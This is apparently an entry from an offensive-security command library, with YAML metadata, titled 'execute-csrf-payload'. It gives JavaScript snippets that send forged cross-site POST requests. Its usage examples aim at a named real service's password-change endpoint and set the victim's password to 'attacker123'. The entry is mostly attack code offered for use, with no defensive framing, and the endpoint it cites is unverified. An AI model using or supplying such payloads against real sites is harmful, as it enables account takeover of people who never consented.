---
id: 3c1b139e-9b3d-45e0-a5d7-7e1d5f176a48
name: execute-csrf-payload
type: command
executor: javascript
data: >-
  var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://target.com/api');
  xhr.send('data=value');
output: null
created_at: '2025-12-11T06:10:22.162Z'
updated_at: '2025-12-11T06:10:22.162Z'
platforms:
  - Web
tags:
  - csrf
  - javascript
verified: false
validated: true
submitted: true
---

# execute-csrf-payload

## Command

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api');
xhr.send('data=value');
```

## Description

JavaScript snippet to execute a CSRF request by sending data to a vulnerable endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Target endpoint | Yes |
| `data` | Payload data | Yes |

## Examples

### Basic Usage

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://www.tiktok.com/api/password/set');
xhr.send('new_password=test');
```

### Advanced Usage

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://www.tiktok.com/api/password/set');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('new_password=attacker123');
```

## Expected Output

The request is sent, and if vulnerable, the action (e.g., password change) occurs.

## Related

- [[commands/test-csrf-endpoint]]
- [[procedures/Craft-CSRF-Payload]]
